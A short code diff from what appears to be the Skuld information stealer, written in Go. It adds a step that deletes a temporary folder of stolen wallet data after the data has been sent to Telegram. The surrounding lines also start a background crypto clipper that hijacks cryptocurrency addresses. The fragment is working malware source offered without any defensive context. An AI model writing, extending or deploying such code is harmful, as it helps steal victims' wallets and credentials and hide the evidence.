@@ -218,6 +218,9 @@ func main() {
 		dataCollector.SendMessage("✅ All data sent successfully to Telegram!")
 	}
 
+	// Clean up wallet data after successful transmission
+	os.RemoveAll(filepath.Join(os.TempDir(), "skuld-wallets"))
+
 	// Start crypto clipper (runs indefinitely in background)
 	dataCollector.SendMessage("💰 Starting crypto clipper...")
 	go clipper.Run(CONFIG["cryptos"].(map[string]string))
